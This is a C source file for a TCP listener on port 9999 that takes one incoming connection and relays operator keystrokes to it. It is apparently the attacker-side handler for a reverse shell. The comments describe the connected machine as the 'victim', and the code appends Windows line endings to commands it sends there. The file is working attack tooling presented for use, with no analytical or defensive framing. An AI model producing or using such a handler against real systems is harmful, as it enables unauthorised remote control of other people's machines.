#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>

#define PORT 9999
#define MAX_BUFFER 4096

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);
    char buffer[MAX_BUFFER];

    fd_set read_fds;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    // Bind to all interfaces
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    // Allow reuse of the address
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 1) < 0) {
        perror("Listen failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Listening on port %d...\n", PORT);

    client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &addr_len);
    if (client_fd < 0) {
        perror("Accept failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Connection received from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

    // Main loop
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(0, &read_fds);             // stdin
        FD_SET(client_fd, &read_fds);     // socket

        if (select(client_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
            perror("select");
            break;
        }

        // Receive data from victim
        if (FD_ISSET(client_fd, &read_fds)) {
            memset(buffer, 0, MAX_BUFFER);
            int bytes_received = recv(client_fd, buffer, MAX_BUFFER - 1, 0);
            if (bytes_received <= 0) {
                printf("Connection closed by victim.\n");
                break;
            }
            // Print without adding another newline
            fwrite(buffer, 1, bytes_received, stdout);
            fflush(stdout);
        }

        // Send input to victim
        if (FD_ISSET(0, &read_fds)) {
            memset(buffer, 0, MAX_BUFFER);
            if (fgets(buffer, MAX_BUFFER - 1, stdin) == NULL) {
                printf("Input error\n");
                break;
            }

            // Add \r\n for Windows compatibility
            size_t len = strlen(buffer);
            if (len > 0 && buffer[len - 1] == '\n') {
                buffer[len - 1] = '\0';
            }
            strcat(buffer, "\r\n");

            if (send(client_fd, buffer, strlen(buffer), 0) < 0) {
                perror("Send failed");
                break;
            }
        }
    }

    close(client_fd);
    close(server_fd);
    return 0;
}
